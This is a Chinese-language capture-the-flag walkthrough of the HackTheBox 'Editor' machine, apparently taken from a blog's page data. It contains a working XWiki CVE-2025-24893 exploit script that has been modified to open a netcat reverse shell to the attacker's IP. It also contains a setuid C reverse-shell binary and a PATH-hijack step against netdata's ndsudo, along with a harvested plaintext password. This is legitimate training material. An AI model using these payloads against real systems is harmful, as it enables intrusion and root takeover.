{"pageProps":{"postData":{"id":"HackTheBoxSeason8 - Editor","contentHtml":"<h1>Season8 - Editor</h1>\n<blockquote>\n<p><a href=\"https://app.hackthebox.com/machines/Editor\">https://app.hackthebox.com/machines/Editor</a> | <code>Linux</code> | <code>Easy</code></p>\n</blockquote>\n<h2>Recon</h2>\n<h3>PortScan</h3>\n<pre><code class=\"hljs language-bash\">➜  Editor nmap -sT -min-rate 5000 -p- 10.10.11.80\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-08-03 15:49 CST\nWarning: 10.10.11.80 giving up on port because retransmission <span class=\"hljs-built_in\">cap</span> hit (10).\nNmap scan report <span class=\"hljs-keyword\">for</span> 10.10.11.80\nHost is up (0.066s latency).\nNot shown: 53573 closed tcp ports (conn-refused), 11959 filtered tcp ports (no-response)\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n8080/tcp open  http-proxy\n\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 66.56 seconds\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  Editor nmap -sT -A -p 22,80,8080 10.10.11.80\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-08-03 15:53 CST\nNmap scan report <span class=\"hljs-keyword\">for</span> 10.10.11.80\nHost is up (0.11s latency).\n\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)\n|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)\n80/tcp   open  http    nginx 1.18.0 (Ubuntu)\n|_http-title: Did not follow redirect to http://editor.htb/\n|_http-server-header: nginx/1.18.0 (Ubuntu)\n8080/tcp open  http    Jetty 10.0.20\n| http-methods:\n|_  Potentially risky methods: PROPFIND LOCK UNLOCK\n|_http-server-header: Jetty(10.0.20)\n|_http-open-proxy: Proxy might be redirecting requests\n| http-webdav-scan:\n|   Server Type: Jetty(10.0.20)\n|   Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, LOCK, UNLOCK\n|_  WebDAV <span class=\"hljs-built_in\">type</span>: Unknown\n| http-title: XWiki - Main - Intro\n|_Requested resource was http://10.10.11.80:8080/xwiki/bin/view/Main/\n| http-cookie-flags:\n|   /:\n|     JSESSIONID:\n|_      httponly flag not <span class=\"hljs-built_in\">set</span>\n| http-robots.txt: 50 disallowed entries (15 shown)\n| /xwiki/bin/viewattachrev/ /xwiki/bin/viewrev/\n| /xwiki/bin/pdf/ /xwiki/bin/edit/ /xwiki/bin/create/\n| /xwiki/bin/inline/ /xwiki/bin/preview/ /xwiki/bin/save/\n| /xwiki/bin/saveandcontinue/ /xwiki/bin/rollback/ /xwiki/bin/deleteversions/\n| /xwiki/bin/cancel/ /xwiki/bin/delete/ /xwiki/bin/deletespace/\n|_/xwiki/bin/undelete/\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice <span class=\"hljs-built_in\">type</span>: general purpose|router\nRunning: Linux 4.X|5.X, MikroTik RouterOS 7.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.\nOS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using proto 1/icmp)\nHOP RTT      ADDRESS\n1   70.74 ms 10.10.14.1\n2   70.92 ms 10.10.11.80\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 13.59 seconds\n</code></pre>\n<h3>枚举测试</h3>\n<p><code>80</code> 端口</p>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Editor/image.png\" alt=\"image.png\"></p>\n<p><code>8080</code> 端口</p>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Editor/image1.png\" alt=\"image.png\"></p>\n<h2><strong>CVE-2025-32429 ❌</strong></h2>\n<pre><code class=\"hljs language-bash\">➜  CVE-2025-32429 ./exploit -u http://wiki.editor.htb\n</code></pre>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Editor/image2.png\" alt=\"image.png\"></p>\n<h2><strong>CVE-2025-24893</strong></h2>\n<p>再根据靶机上的版本 <code>15.10.8</code> 能搜索出来 <code>CVE-2025-24893</code></p>\n<blockquote>\n<p><a href=\"https://www.exploit-db.com/exploits/52136\">https://www.exploit-db.com/exploits/52136</a></p>\n</blockquote>\n<p>原本的 POC 是读取  <code>/etc/passwd</code> 的，这里修改为反弹 <code>shell</code> 的命令</p>\n<pre><code class=\"hljs language-bash\">import requests\n\n<span class=\"hljs-comment\"># Banner</span>\ndef display_banner():\n    <span class=\"hljs-comment\"># 注意：这里原代码中的 print 语句没有缩进，</span>\n    <span class=\"hljs-comment\"># 我已将其放入函数体内。</span>\n    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"=\"</span> * 80)\n    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Exploit Title: CVE-2025-24893 - XWiki Platform Remote Code Execution\"</span>)\n    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Exploit Author: Al Baradi Joy\"</span>)\n    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"GitHub Exploit: https://github.com/a1baradi/Exploit/blob/main/CVE-2025-24893.py\"</span>)\n    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"=\"</span> * 80)\n\n<span class=\"hljs-comment\"># Function to detect the target protocol (HTTP or HTTPS)</span>\ndef detect_protocol(domain):\n    https_url = f<span class=\"hljs-string\">\"https://{domain}\"</span>\n    http_url = f<span class=\"hljs-string\">\"http://{domain}\"</span>\n\n    try:\n        response = requests.get(https_url, <span class=\"hljs-built_in\">timeout</span>=5, allow_redirects=True)\n        <span class=\"hljs-keyword\">if</span> response.status_code &#x3C; 400:\n            <span class=\"hljs-built_in\">print</span>(f<span class=\"hljs-string\">\"[✔] Target supports HTTPS: {https_url}\"</span>)\n            <span class=\"hljs-built_in\">return</span> https_url\n    except requests.exceptions.RequestException:\n        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"[!] HTTPS not available, falling back to HTTP.\"</span>)\n\n    try:\n        response = requests.get(http_url, <span class=\"hljs-built_in\">timeout</span>=5, allow_redirects=True)\n        <span class=\"hljs-keyword\">if</span> response.status_code &#x3C; 400:\n            <span class=\"hljs-built_in\">print</span>(f<span class=\"hljs-string\">\"[✔] Target supports HTTP: {http_url}\"</span>)\n            <span class=\"hljs-built_in\">return</span> http_url\n    except requests.exceptions.RequestException:\n        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"[✖] Target is unreachable on both HTTP and HTTPS.\"</span>)\n        <span class=\"hljs-built_in\">exit</span>(1)\n\n<span class=\"hljs-comment\"># Exploit function</span>\ndef exploit(target_url):\n    target_url = detect_protocol(target_url.replace(<span class=\"hljs-string\">\"http://\"</span>, <span class=\"hljs-string\">\"\"</span>).replace(<span class=\"hljs-string\">\"https://\"</span>, <span class=\"hljs-string\">\"\"</span>).strip())\n    exploit_url = f<span class=\"hljs-string\">\"{target_url}/bin/get/Main/SolrSearch?media=rss&#x26;text=%7D%7D%7D%7B%7Basync%20async=false%7D%7D%7B%7Bgroovy%7D%7Dprintln(%22busybox%20nc%2010.10.14.62%201234%20-e%20/bin/bash%22.execute().text)%7B%7B/groovy%7D%7D%7B%7B/async%7D%7D\"</span>\n\n    try:\n        <span class=\"hljs-built_in\">print</span>(f<span class=\"hljs-string\">\"[+] Sending request to: {exploit_url}\"</span>)\n        response = requests.get(exploit_url, <span class=\"hljs-built_in\">timeout</span>=10)\n\n        <span class=\"hljs-comment\"># Check if the exploit was successful</span>\n        <span class=\"hljs-keyword\">if</span> response.status_code == 200 and <span class=\"hljs-string\">\"root:\"</span> <span class=\"hljs-keyword\">in</span> response.text:\n            <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"[✔] Exploit successful! Output received:\"</span>)\n            <span class=\"hljs-built_in\">print</span>(response.text)\n        <span class=\"hljs-keyword\">else</span>:\n            <span class=\"hljs-built_in\">print</span>(f<span class=\"hljs-string\">\"[✖] Exploit failed. Status code: {response.status_code}\"</span>)\n\n    except requests.exceptions.ConnectionError:\n        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"[✖] Connection failed. Target may be down.\"</span>)\n    except requests.exceptions.Timeout:\n        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"[✖] Request timed out. Target is slow or unresponsive.\"</span>)\n    except requests.exceptions.RequestException as e:\n        <span class=\"hljs-built_in\">print</span>(f<span class=\"hljs-string\">\"[✖] Unexpected error: {e}\"</span>)\n\n<span class=\"hljs-comment\"># Main execution</span>\n<span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">\"__main__\"</span>:\n    display_banner()\n    target = input(<span class=\"hljs-string\">\"[?] Enter the target URL (without http/https): \"</span>).strip()\n    exploit(target)\n\n</code></pre>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Editor/image3.png\" alt=\"image.png\"></p>\n<p>没话说，环境恶心人，后面一直 502</p>\n<p>后面就是进入到 <code>shell</code> 后，在 <code>xwiki</code> 的目录中能找到密码</p>\n<pre><code class=\"hljs language-bash\">grep -rE <span class=\"hljs-string\">'password'</span> /usr/lib/xwiki\n...\ntheEd1t0rTeam99\n</code></pre>\n<p>测试凭据</p>\n<pre><code class=\"hljs language-bash\">ssh oliver@10.10.11.80\n</code></pre>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Editor/image4.png\" alt=\"image.png\"></p>\n<p>成功进入，读取 <code>user.txt</code></p>\n<pre><code class=\"hljs language-bash\">oliver@editor:~$ <span class=\"hljs-built_in\">cat</span> user.txt \n0c0bf7xxxxxxxxxxxxxxxxxxxxxxxxxxx\n</code></pre>\n<h2>权限提升</h2>\n<p><code>id</code> 信息，有一个奇特的组 <code>netdata</code></p>\n<pre><code class=\"hljs language-bash\">oliver@editor:~$ <span class=\"hljs-built_in\">id</span>\nuid=1000(oliver) gid=1000(oliver) <span class=\"hljs-built_in\">groups</span>=1000(oliver),999(netdata)\n</code></pre>\n<p>寻找拥有 <code>suid</code> 权限的程序</p>\n<pre><code class=\"hljs language-bash\">oliver@editor:~$ find / -perm -u=s -<span class=\"hljs-built_in\">type</span> f 2>/dev/null\n/opt/netdata/usr/libexec/netdata/plugins.d/cgroup-network\n/opt/netdata/usr/libexec/netdata/plugins.d/network-viewer.plugin\n/opt/netdata/usr/libexec/netdata/plugins.d/local-listeners\n/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo\n/opt/netdata/usr/libexec/netdata/plugins.d/ioping\n/opt/netdata/usr/libexec/netdata/plugins.d/nfacct.plugin\n/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.plugin\n....\n</code></pre>\n<p>监听端口信息</p>\n<pre><code class=\"hljs language-bash\">oliver@editor:~$ ss -tupln\nNetid             State               Recv-Q              Send-Q                                Local Address:Port                            Peer Address:Port             Process             \nudp               UNCONN              0                   0                                         127.0.0.1:8125                                 0.0.0.0:*                                    \nudp               UNCONN              0                   0                                     127.0.0.53%lo:53                                   0.0.0.0:*                                    \ntcp               LISTEN              0                   4096                                  127.0.0.53%lo:53                                   0.0.0.0:*                                    \ntcp               LISTEN              0                   4096                                      127.0.0.1:45439                                0.0.0.0:*                                    \ntcp               LISTEN              0                   70                                        127.0.0.1:33060                                0.0.0.0:*                                    \ntcp               LISTEN              0                   511                                         0.0.0.0:80                                   0.0.0.0:*                                    \ntcp               LISTEN              0                   151                                       127.0.0.1:3306                                 0.0.0.0:*                                    \ntcp               LISTEN              0                   128                                         0.0.0.0:22                                   0.0.0.0:*                                    \ntcp               LISTEN              0                   4096                                      127.0.0.1:8125                                 0.0.0.0:*                                    \ntcp               LISTEN              0                   4096                                      127.0.0.1:19999                                0.0.0.0:*                                    \ntcp               LISTEN              0                   50                                                *:8080                                       *:*                                    \ntcp               LISTEN              0                   511                                            [::]:80                                      [::]:*                                    \ntcp               LISTEN              0                   128                                            [::]:22                                      [::]:*                                    \ntcp               LISTEN              0                   50                               [::ffff:127.0.0.1]:8079                                       *:* \n</code></pre>\n<p>从网上得知 <code>Netdata</code> 是一个分布式实时可观测性平台，其中它的一些插件等存在本地权限提升漏洞</p>\n<p>例如 ndsudo</p>\n<blockquote>\n<p><a href=\"https://github.com/AzureADTrent/CVE-2024-32019-POC\">https://github.com/AzureADTrent/CVE-2024-32019-POC</a></p>\n</blockquote>\n<blockquote>\n<p><a href=\"https://cve.imfht.com/detail/CVE-2024-32019\">https://cve.imfht.com/detail/CVE-2024-32019</a></p>\n</blockquote>\n<p>首先创建恶意反弹<code>shell</code>的程序</p>\n<pre><code class=\"hljs language-bash\">➜  Editor <span class=\"hljs-built_in\">cat</span> sunset.c\n<span class=\"hljs-comment\">#include &#x3C;stdlib.h></span>\n<span class=\"hljs-comment\">#include &#x3C;unistd.h></span>\nint <span class=\"hljs-function\"><span class=\"hljs-title\">main</span></span>() {\n    setuid(0);\n    setgid(0);\n    system(<span class=\"hljs-string\">\"busybox nc 10.10.14.62 1234 -e /bin/bash\"</span>);\n    <span class=\"hljs-built_in\">return</span> 0;\n}\n</code></pre>\n<p>编译</p>\n<pre><code class=\"hljs language-bash\">➜  Editor gcc -o nvme sunset.c\n</code></pre>\n<p>上传到靶机然后执行</p>\n<pre><code class=\"hljs language-bash\">oliver@editor:/tmp$ <span class=\"hljs-built_in\">export</span> PATH=/tmp:<span class=\"hljs-variable\">$PATH</span>\noliver@editor:/tmp$ /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list\n</code></pre>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Editor/image5.png\" alt=\"image.png\"></p>\n<p>读取 <code>root.txt</code></p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-built_in\">cat</span> /root/root.txt\n095a09xxxxxxxxxxxxxxxxxxxxxxxx\n</code></pre>\n<h2>总结</h2>\n<p>恶心人这个web</p>","title":"HackTheBox - Season8 - Editor","date":"2025-08-03","updated":"2025-08-03","tags":["HackTheBox","Linux","netdata","ndsudo","xwiki","CVE-2024-24893","encrypt"],"categories":"靶机","comments":true,"description":"Season8 - Editor\n\n https://app.hackthebox.com/machines/Editor | `Linux` | `Easy`\n \n\nRecon\n\nPortScan\n\n\n\n\n\n枚举测试\n\n`80` 端口\n\n\n\n`8080` 端口\n\n\n\nCVE-2025-32429 ❌\n\n\n\n\n\nCVE-2025-24893\n\n再根据靶机上的版本 `15.10.8` 能搜索出来 `...","isEncrypted":true},"recentPosts":[{"id":"CyberstrikelabLab3","title":"Cyberstrikelab - Lab3","date":"2025-08-12","isEncrypted":false,"year":"2025","month":"08","day":"12"},{"id":"CyberstrikelabLab2","title":"Cyberstrikelab - Lab2","date":"2025-08-12","isEncrypted":false,"year":"2025","month":"08","day":"12"},{"id":"CyberstrikelabLab-1","title":"Cyberstrikelab - Lab1","date":"2025-08-12","isEncrypted":false,"year":"2025","month":"08","day":"12"},{"id":"HackTheBoxSeason8 - Cobblestone","title":"HackTheBox - Season8 - Cobblestone","date":"2025-08-11","isEncrypted":true,"year":"2025","month":"08","day":"11"},{"id":"TheHackersLabsShadowGate","title":"TheHackersLabs - ShadowGate","date":"2025-08-06","isEncrypted":false,"year":"2025","month":"08","day":"06"},{"id":"HackTheBoxSeason7-Code","title":"HackTheBox - Machine - Code","date":"2025-04-04","isEncrypted":false,"year":"2025","month":"08","day":"06"},{"id":"TheHackersLabsOfusPingu","title":"TheHackersLabs - OfusPingu","date":"2025-08-05","isEncrypted":false,"year":"2025","month":"08","day":"05"}]},"__N_SSG":true}